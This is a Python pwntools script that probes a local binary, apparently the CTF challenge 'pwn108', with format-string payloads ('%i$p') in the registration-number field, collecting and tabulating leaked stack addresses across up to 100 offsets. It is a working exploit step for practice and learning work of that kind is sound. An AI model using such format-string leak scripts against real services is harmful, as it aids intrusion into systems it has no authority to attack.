from pwn import *

def leak_addresses(binary='./pwn108', max_i=40, show_only_valid=True):
    leaks = {}
    log.info(f"Leaking up to %{max_i}$p from Reg No input...")

    for i in range(1, max_i + 1):
        p = process(binary)
        try:
            p.recvuntil(b"=[Your name]:")
            p.sendline(b"Zayd")
            p.recvuntil(b"=[Your Reg No]:")
            payload = f"%{i}$p".encode()
            p.sendline(payload)
            
            out = p.recvuntil(b"Institue", timeout=1).decode(errors="ignore")

            for line in out.splitlines():
                if "Register no" in line:
                    value = line.split(":")[1].strip()
                    break
            else:
                value = "(missing)"

            if show_only_valid and ("(nil)" in value or "missing" in value):
                continue

            leaks[i] = value
        except Exception as e:
            log.warning(f"Failed at offset %{i}$p: {e}")
        finally:
            p.close()

    # Display cleaned result
    print("\n📥 Leaked Stack Addresses:\n")
    print(f"{'Offset':>8} | {'Leak':<18}")
    print("-" * 30)
    for i, val in leaks.items():
        print(f"%{i}$p  | {val}")

    return leaks

leaks = leak_addresses(binary='./pwn108', max_i=100)
